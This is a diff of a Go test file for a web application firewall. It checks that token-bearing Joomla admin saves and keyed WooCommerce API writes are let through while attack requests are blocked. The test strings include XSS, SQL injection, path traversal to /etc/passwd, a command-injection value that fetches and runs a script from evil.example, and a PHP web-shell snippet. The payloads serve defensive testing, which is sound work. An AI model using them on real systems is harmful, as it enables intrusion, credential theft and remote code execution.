@@ -188,6 +188,11 @@ func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
 		"&jform%5Boffline_message%5D=" + urlEncode(`<p>Back soon</p><script>alert(1)</script>`) + "&task=application.apply&" + token
 	attack := url.Values{"q": {"<script>alert(document.cookie)</script>"}, "id": {"1' UNION SELECT user,password FROM users-- -"},
 		"file": {"../../../../etc/passwd"}, "cmd": {";cat /etc/passwd; wget http://evil.example/x.sh -O /tmp/x; sh /tmp/x"}}.Encode()
+	sqli := url.Values{"id": {"1' UNION SELECT user,password FROM users-- -"}, "sort": {"1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"},
+		"user": {"admin' OR '1'='1' -- -"}, "cat": {"1;SELECT table_name FROM information_schema.tables"}}.Encode()
+	heavyFile := "content=" + urlEncode(`<?php defined('_JEXEC') or die; system($_GET['c']); exec('cat /etc/passwd'); passthru('wget http://example.org/x.sh'); include('../../../../etc/passwd'); ?>`+
+		`<script>alert(document.cookie)</script><iframe src="javascript:alert(1)"></iframe><svg onload=alert(1)>`)
+	heavyProduct := "name=Shoes&description=" + urlEncode(`<script>var sku='CJ1';</script><img src=x onerror="this.style.display='none'"><svg onload="init()"><iframe src="javascript:void(0)"></iframe><a href="javascript:zoom()">zoom</a><body onload="x()"><object data="javascript:x()"></object><embed src="javascript:x()"><div style="width:expression(alert(1))">`)
 	cases := []struct {
 		name, host, uri, body string
 		hdr                   []string
@@ -226,7 +231,19 @@ func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
 		{"A token-shaped field on the front end", "joomla.example.ir", "/index.php?option=com_content&view=featured&format=feed",
 			"x=" + urlEncode(`{source}<?=file_put_contents('a.php',file_get_contents('https://evil.example/x'));?>{/source}`) + "&" + token, nil, 403},
 		{"A token-shaped field in another admin file", "joomla.example.ir", "/administrator/components/com_x/upload.php", htmaker + "&" + token, nil, 403},
-		{"An attack tool posting to the administrator with a token-shaped field", "joomla.example.ir", "/administrator/index.php", attack + "&" + token, nil, 403}, // ssshoesmaker.com (business900, 2026-10-30/31): CJdropshipping's
+		// Since 0.24.17 a save with the token skips the code, script and
+		// path families (Joomla checks the token and the login before a
+		// save runs); SQL injection is still checked, under threshold 30.
+		{"An attack tool posting SQL injection to the administrator with a token-shaped field", "joomla.example.ir", "/administrator/index.php", sqli + "&" + token, nil, 403},
+		{"The mixed attack without the token-shaped field", "joomla.example.ir", "/administrator/index.php", attack, nil, 403},
+		// LiteSpeed scores a request again after it passed the first check
+		// (business600, 2026-10-31: 13 became 39): a save far above any
+		// threshold passes because its families do not run at all.
+		{"Joomla File Explorer save scoring far above 60 with the token", "joomla.example.ir", "/administrator/?option=com_ffexplorer", heavyFile + "&task=save&" + token, []string{joomla}, 200},
+		{"The same without the token", "joomla.example.ir", "/administrator/?option=com_ffexplorer", heavyFile + "&task=save", []string{joomla}, 403},
+		{"WooCommerce API product HTML scoring far above 30 with keys", "shop.example.pk", "/wp-json/wc/v3/products?consumer_key=" + ck + "&consumer_secret=" + cs, heavyProduct, nil, 200},
+		{"The same without keys", "shop.example.pk", "/wp-json/wc/v3/products", heavyProduct, nil, 403},
+		{"SQL injection with keys", "shop.example.pk", "/wp-json/wc/v3/products?consumer_key=" + ck, sqli, nil, 403}, // ssshoesmaker.com (business900, 2026-10-30/31): CJdropshipping's
 		// product listing refused as XSS (941100, 941160).
 		{"WooCommerce API product write with keys", "shop.example.pk", "/wp-json/wc/v3/products?consumer_key=" + ck + "&consumer_secret=" + cs, product, nil, 200},
 		{"WooCommerce API batch with OAuth keys", "shop.example.pk", "/wp-json/wc/v3/products/batch?oauth_consumer_key=" + ck + "&oauth_signature=abc", product, nil, 200},
